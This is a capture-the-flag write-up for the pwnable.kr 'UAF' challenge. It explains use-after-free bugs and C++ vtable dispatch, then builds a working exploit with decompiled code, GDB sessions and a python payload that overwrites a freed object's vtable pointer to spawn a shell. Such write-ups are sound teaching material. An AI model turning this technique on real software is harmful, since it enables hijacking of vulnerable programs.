---
title: "Use-After-Free Meets VTable Hijacking"
date: 2026-5-12
---

In this post I'm walking through the "UAF" challenge from [pwnable.kr](https://pwnable.kr/), which combines a classic use-after-free vunlerability with a twist of C++ virtual functions.

## Background: UAF and C++ VTables
Use-After-Free (UAF) is a memory corruption vulnerability that happens when a program continues to use a pointer after the memory it points to has already been freed. Since freeing manually allocated memory does not actually null the pointer or delete the allocated content, the old pointer may still refernece the region. If and when the allocator reuses the same chunk for a different object, the original code can end up interacting with attacker controlled data instead of the intended structure. 

In C++, classes with virtual functions rely on a mechanism called a vtable (virtual table) to support dynamic dispatch. Eyach object of a polymorphic class contains a hidden pointer to its vtable, which is essentially an array of function pointers. When a virtual function is called, the program does not call the function directly but instead, it looks up the correct function address through the vtable and jumps to it.

This means that if an attacker can overwrite an object’s vtable pointer (for example through a UAF vuln), they can potentially redirect execution flow by pointing it to a fake vtable containing chosen function addresses.

## Reconstructing the Source
Loading the binary into IDA and performing a decompilation of `main()`, we can mostly recover the relevant class behavior even without the original source code. The binary implements a simple C++ inheritance hierarchy where both Man and Woman derive from a base Human class. Because the classes use virtual functions every object begins with a vtable pointer making them interesting targets for heap corruption.

```c++
int __fastcall __noreturn main(int argc, const char **argv, const char **envp)
{
  Human *v3; // rbx
  __int64 v4; // rdx
  Human *v5; // rbx
  int v6; // eax
  __int64 v7; // rax
  Human *v8; // rbx
  Human *v9; // rbx
  unsigned int v10; // [rsp+1Ch] [rbp-64h] BYREF
  Human *m; // [rsp+20h] [rbp-60h]
  Human *w; // [rsp+28h] [rbp-58h]
  size_t nbytes; // [rsp+30h] [rbp-50h]
  void *buf; // [rsp+38h] [rbp-48h]
  _BYTE v15[40]; // [rsp+40h] [rbp-40h] BYREF
  unsigned __int64 v16; // [rsp+68h] [rbp-18h]

  v16 = __readfsqword(0x28u);
  std::allocator<char>::allocator(&v10, argv, envp);
  std::string::basic_string<std::allocator<char>>(v15, "Jack", &v10);
  v3 = (Human *)operator new(0x30uLL);
  Man::Man(v3, v15, 25LL);
  m = v3;
  std::string::~string(v15);
  std::allocator<char>::~allocator(&v10);
  std::allocator<char>::allocator(&v10, v15, v4);
  std::string::basic_string<std::allocator<char>>(v15, "Jill", &v10);
  v5 = (Human *)operator new(0x30uLL);
  Woman::Woman(v5, v15, 21LL);
  w = v5;
  std::string::~string(v15);
  std::allocator<char>::~allocator(&v10);
  while ( 1 )
  {
    while ( 1 )
    {
      std::operator<<<std::char_traits<char>>(&std::cout, "1. use\n2. after\n3. free\n");
      std::istream::operator>>(&std::cin, &v10);
      if ( v10 == 3 )
        break;
      if ( v10 <= 3 )
      {
        if ( v10 == 1 )
        {
          (*(void (__fastcall **)(Human *))(*(_QWORD *)m + 8LL))(m);
          (*(void (__fastcall **)(Human *))(*(_QWORD *)w + 8LL))(w);
        }
        else if ( v10 == 2 )
        {
          nbytes = atoi(argv[1]);
          buf = (void *)operator new[](nbytes);
          v6 = open(argv[2], 0);
          read(v6, buf, nbytes);
          v7 = std::operator<<<std::char_traits<char>>(&std::cout, "your data is allocated");
          std::ostream::operator<<(v7, &std::endl<char,std::char_traits<char>>);
        }
      }
    }
    v8 = m;
    if ( m )
    {
      Human::~Human(m);
      operator delete(v8, 0x30uLL);
    }
    v9 = w;
    if ( w )
    {
      Human::~Human(w);
      operator delete(v9, 0x30uLL);
    }
  }
}
```
The menu exposes three important actions, option 1 invokes a function on both objects through their vtable pointers:

```c++
(*(void (__fastcall **)(Human *))(*(_QWORD *)m + 8LL))(m);
```
This corresponds to a normal virtual method call such as `m->introduce()` which can also be decompiled for readability.
```c++
__int64 __fastcall Human::introduce(Human *this)
{
  __int64 v1; // rax
  __int64 v2; // rax
  __int64 v3; // rax
  __int64 v4; // rax
  __int64 v5; // rax

  v1 = std::operator<<<std::char_traits<char>>(&std::cout, "My name is ");
  v2 = std::operator<<<char>(v1, (char *)this + 16);
  std::ostream::operator<<(v2, &std::endl<char,std::char_traits<char>>);
  v3 = std::operator<<<std::char_traits<char>>(&std::cout, "I am ");
  v4 = std::ostream::operator<<(v3, *((unsigned int *)this + 2));
  v5 = std::operator<<<std::char_traits<char>>(v4, " years old");
  return std::ostream::operator<<(v5, &std::endl<char,std::char_traits<char>>);
}
```

Option 2 allocates a user controlled heap chunk using `new[]` and fills it with data read from a file and a size passed through a command line argument.

Finally, option 3 frees both objects but never nulls the pointers afterward. The dangling references remain accessible and can later be reused by option 1, creating a classic use-after-free vulnerability. If we reclaim one of the freed chunks with controlled data, we can overwrite the original object's vtable pointer and redirect execution during the next virtual function call.

Our end goal is eventually to redirect control flow into the `give_shell` win function.
```c++
int __fastcall Human::give_shell(Human *this)
{
  __gid_t v1; // ebx
  __gid_t v2; // eax

  v1 = getegid();
  v2 = getegid();
  setregid(v2, v1);
  return system("/bin/sh");
}
```

## Finding The Objects

```
gef➤  set print asm-demangle
gef➤  disassemble main
...
   0x000000000040262a <+84>:    call   0x4023b0 <operator new(unsigned long)@plt>
   0x000000000040262f <+89>:    mov    rbx,rax
   0x0000000000402632 <+92>:    mov    edx,0x19
   0x0000000000402637 <+97>:    mov    rsi,r12
   0x000000000040263a <+100>:   mov    rdi,rbx
   0x000000000040263d <+103>:   call   0x402aa6 <Man::Man(std::__cxx11::basic_string<char, std::char_traits<char>, std::allocator<char> >, int)>
   0x0000000000402642 <+108>:   mov    QWORD PTR [rbp-0x60],rbx
   0x0000000000402646 <+112>:   lea    rax,[rbp-0x40]
   0x000000000040264a <+116>:   mov    rdi,rax
   0x000000000040264d <+119>:   call   0x402300 <std::__cxx11::basic_string<char, std::char_traits<char>, std::allocator<char> >::~basic_string()@plt>
   0x0000000000402652 <+124>:   lea    rax,[rbp-0x64]
   0x0000000000402656 <+128>:   mov    rdi,rax
   0x0000000000402659 <+131>:   call   0x4023f0 <std::allocator<char>::~allocator()@plt>
   0x000000000040265e <+136>:   lea    rax,[rbp-0x64]
   0x0000000000402662 <+140>:   mov    rdi,rax
   0x0000000000402665 <+143>:   call   0x4024c0 <std::allocator<char>::allocator()@plt>
   0x000000000040266a <+148>:   lea    rdx,[rbp-0x64]
   0x000000000040266e <+152>:   lea    rax,[rbp-0x40]
   0x0000000000402672 <+156>:   lea    rcx,[rip+0x9dc]        # 0x403055
   0x0000000000402679 <+163>:   mov    rsi,rcx
   0x000000000040267c <+166>:   mov    rdi,rax
   0x000000000040267f <+169>:   call   0x402ce2 <std::__cxx11::basic_string<char, std::char_traits<char>, std::allocator<char> >::basic_string<std::allocator<char> >(char const*, std::allocator<char> const&)>
   0x0000000000402684 <+174>:   lea    r12,[rbp-0x40]
   0x0000000000402688 <+178>:   mov    edi,0x30
   0x000000000040268d <+183>:   call   0x4023b0 <operator new(unsigned long)@plt>
   0x0000000000402692 <+188>:   mov    rbx,rax
   0x0000000000402695 <+191>:   mov    edx,0x15
   0x000000000040269a <+196>:   mov    rsi,r12
   0x000000000040269d <+199>:   mov    rdi,rbx
   0x00000000004026a0 <+202>:   call   0x402b6a <Woman::Woman(std::__cxx11::basic_string<char, std::char_traits<char>, std::allocator<char> >, int)>
   0x00000000004026a5 <+207>:   mov    QWORD PTR [rbp-0x58],rbx
   0x00000000004026a9 <+211>:   lea    rax,[rbp-0x40]
   0x00000000004026ad <+215>:   mov    rdi,rax
   0x00000000004026b0 <+218>:   call   0x402300 <std::__cxx11::basic_string<char, std::char_traits<char>, std::allocator<char> >::~basic_string()@plt>
```
We'll want to break just after both objects are created somewhere around `0x00000000004026a9`
```
gef➤  x/2gx $rbp-0x60
0x7fffffffd740: 0x00000000004182b0      0x00000000004182f0
```
Inspecting the object at rbp-0x60 reveals its memory layout. The first 8 bytes contain the object's vptr (pointer to its vtable), followed by the object's data members such as the age (0x19, or 25d) and the string "Jack".
```
gef➤  x/4gx 0x00000000004182b0
0x4182b0:       0x0000000000404d80      0x0000000000000019
0x4182c0:       0x00000000004182d0      0x0000000000000004
gef➤  x/s 0x00000000004182d0
0x4182d0:       "Jack"
gef➤  x/4gx 0x0000000000404d80
0x404d80 <vtable for Man+16>:   0x000000000040295e      0x0000000000402b20
0x404d90 <vtable for Human>:    0x0000000000000000      0x0000000000404de0
```
Inspecting the vtable shows pointers to the class's virtual functions.
```
gef➤  x 0x000000000040295e
0x40295e <Human::give_shell()>: 0xe5894855fa1e0ff3
gef➤  x 0x0000000000402b20
0x402b20 <Man::introduce()>:    0xe5894855fa1e0ff3
```
Virtual function calls work by indexing into the vtable like an array of function pointers. Since each entry is 8 bytes on x86-64, calling `m->introduce()` accesses the second entry, equivalent to vtable[1].

And one last check, we'll inspect the heap chunk of the allocated object and note it down for later use.
```
gef➤  heap chunk 0x00000000004182b0
Chunk(addr=0x4182b0, size=0x40, flags=PREV_INUSE | IS_MMAPPED | NON_MAIN_ARENA)
Chunk size: 64 (0x40)
Usable size: 56 (0x38)
Previous chunk size: 0 (0x0)
PREV_INUSE | IS_MMAPPED | NON_MAIN_ARENA
```

## Exploitation
So as we've inferred from the previous section, what entering 1 in the menu practically does is call `vtable[1]` so our goal here is to shift the vtable pointer down by 8 bytes resulting in `give_shell` being executed when `m->introduce()` is called.

Our vtable base address is `0x0000000000404d80`, subtracting 0x8 from it results in the desired address of `0x0000000000404d78`.

Firstly we'll need to prove that we can indeed overwrite the object using the vulnerable `read()` function with a basic payload that can be easily traced through memory. Lets try matching the chunk size of 0x40 that we've seen earlier.
```bash
┌──(rvarr㉿DESKTOP)-[~/pwnable.kr/uaf]
└─$ python -c "print('A'*0x40)" > payload
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
```
```
gef➤  r 64 payload
─────────────────────────────────────────────────────────────────────────────────────────── stack ────
0x00007fffffffd700│+0x0000: 0x00007fffffffd898  →  0x00007fffffffdb58  →  "/home/rvarr/pwnable.kr/uaf/uaf"     ← $rsp
0x00007fffffffd708│+0x0008: 0x0000000300406010
0x00007fffffffd710│+0x0010: 0xb7b6b5b4b3b2b1b0
0x00007fffffffd718│+0x0018: 0x00000001f7bba0bc
0x00007fffffffd720│+0x0020: 0x00000000004182b0  →  0x0000000000000418
0x00007fffffffd728│+0x0028: 0x00000000004182f0  →  0x00000000004186a8  →  0x0000000000000000
0x00007fffffffd730│+0x0030: 0x0000000000000040 ("@"?)
0x00007fffffffd738│+0x0038: 0x0000000000418ba0  →  "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA[...]"
───────────────────────────────────────────────────────────────────────────────────── code:x86:64 ────
     0x402714 <main+013e>      mov    rax, QWORD PTR [rbp-0x60]
     0x402718 <main+0142>      mov    rax, QWORD PTR [rax]
     0x40271b <main+0145>      add    rax, 0x8
 →   0x40271f <main+0149>      mov    rdx, QWORD PTR [rax]
     0x402722 <main+014c>      mov    rax, QWORD PTR [rbp-0x60]
     0x402726 <main+0150>      mov    rdi, rax
     0x402729 <main+0153>      call   rdx
     0x40272b <main+0155>      mov    rax, QWORD PTR [rbp-0x58]
     0x40272f <main+0159>      mov    rax, QWORD PTR [rax]
───────────────────────────────────────────────────────────────────────────────────────── threads ────
[#0] Id 1, Name: "uaf", stopped 0x40271f in main (), reason: SIGSEGV
─────────────────────────────────────────────────────────────────────────────────────────── trace ────
[#0] 0x40271f → main()
──────────────────────────────────────────────────────────────────────────────────────────────────────
gef➤  heap chunk 0x0000000000418ba0
Chunk(addr=0x418ba0, size=0x50, flags=PREV_INUSE | IS_MMAPPED | NON_MAIN_ARENA)
Chunk size: 80 (0x50)
Usable size: 72 (0x48)
Previous chunk size: 0 (0x0)
PREV_INUSE | IS_MMAPPED | NON_MAIN_ARENA
```
Due to the way glibc's allocator works freed chunks are sorted by size and reused for same sized allocations, so our payload must produce a chunk of the same size as the original objects. The original objects were allocated with `operator new(0x30)`, which with the 16-byte chunk header rounds up to 0x40. Requesting 46 bytes gives us 46 + 16 = 62, which rounds up to the same 0x40, ensuring we reclaim the exact freed chunk.

Take a close look at the resulting addresses, it is the exact same region that was allocated to `m` and `w` at the beginning which means that with a proper payload we are able to override the vtable and redirect execution flow.
```bash
┌──(rvarr㉿DESKTOP)-[~/pwnable.kr/uaf]
└─$ python -c "print('A'*8+'B'*8+'C'*8+'D'*8+'E'*6)" > payload2
AAAAAAAABBBBBBBBCCCCCCCCDDDDDDDDEEEEEE
```
```
─────────────────────────────────────────────────────────────────────────────────────────── stack ────
0x00007fffffffd700│+0x0000: 0x00007fffffffd898  →  0x00007fffffffdb57  →  "/home/rvarr/pwnable.kr/uaf/uaf"     ← $rsp
0x00007fffffffd708│+0x0008: 0x0000000300406010
0x00007fffffffd710│+0x0010: 0xb7b6b5b4b3b2b1b0
0x00007fffffffd718│+0x0018: 0x00000001f7bba0bc
0x00007fffffffd720│+0x0020: 0x00000000004182b0  →  "AAAAAAAABBBBBBBBCCCCCCCCDDDDDDDDEEEEEE\n"
0x00007fffffffd728│+0x0028: 0x00000000004182f0  →  "AAAAAAAABBBBBBBBCCCCCCCCDDDDDDDDEEEEEE\n"
0x00007fffffffd730│+0x0030: 0x000000000000002e ("."?)
0x00007fffffffd738│+0x0038: 0x00000000004182b0  →  "AAAAAAAABBBBBBBBCCCCCCCCDDDDDDDDEEEEEE\n"
───────────────────────────────────────────────────────────────────────────────────── code:x86:64 ────
     0x402714 <main+013e>      mov    rax, QWORD PTR [rbp-0x60]
     0x402718 <main+0142>      mov    rax, QWORD PTR [rax]
     0x40271b <main+0145>      add    rax, 0x8
 →   0x40271f <main+0149>      mov    rdx, QWORD PTR [rax]
     0x402722 <main+014c>      mov    rax, QWORD PTR [rbp-0x60]
     0x402726 <main+0150>      mov    rdi, rax
     0x402729 <main+0153>      call   rdx
     0x40272b <main+0155>      mov    rax, QWORD PTR [rbp-0x58]
     0x40272f <main+0159>      mov    rax, QWORD PTR [rax]
───────────────────────────────────────────────────────────────────────────────────────── threads ────
[#0] Id 1, Name: "uaf", stopped 0x40271f in main (), reason: SIGSEGV
─────────────────────────────────────────────────────────────────────────────────────────── trace ────
[#0] 0x40271f → main()
──────────────────────────────────────────────────────────────────────────────────────────────────────
gef➤  heap chunk 0x00000000004182b0
Chunk(addr=0x4182b0, size=0x40, flags=PREV_INUSE | IS_MMAPPED | NON_MAIN_ARENA)
Chunk size: 64 (0x40)
Usable size: 56 (0x38)
Previous chunk size: 0 (0x0)
PREV_INUSE | IS_MMAPPED | NON_MAIN_ARENA

gef➤  x/4gx 0x00000000004182b0
0x4182b0:       0x4141414141414141      0x4242424242424242
0x4182c0:       0x4343434343434343      0x4444444444444444
```
Now recall to the subtracting of bytes we've done on the vtable base address - `0x0000000000404d78`.
```bash
┌──(rvarr㉿DESKTOP)-[~/pwnable.kr/uaf]
└─$ python -c "print('\x78\x4d\x40\x00\x00\x00\x00\x00'+'A'*38)" > payload3
```
The order of bytes is flipped due to the endianness of the binary, reversing the least significant bits to the front followed by a remainder of padding.
```
uaf@ubuntu:~$ ./uaf 46 /tmp/payload3
1. use
2. after
3. free
3
1. use
2. after
3. free
2
your data is allocated
1. use
2. after
3. free
2
your data is allocated
1. use
2. after
3. free
1
$ cat flag
[flag]
```

Overall it was an enjoyable challenge that is simple yet intricate enough to cause my to scratch my head at times, and most importantly strengthening my familiarity with common C++ vulnerabilities.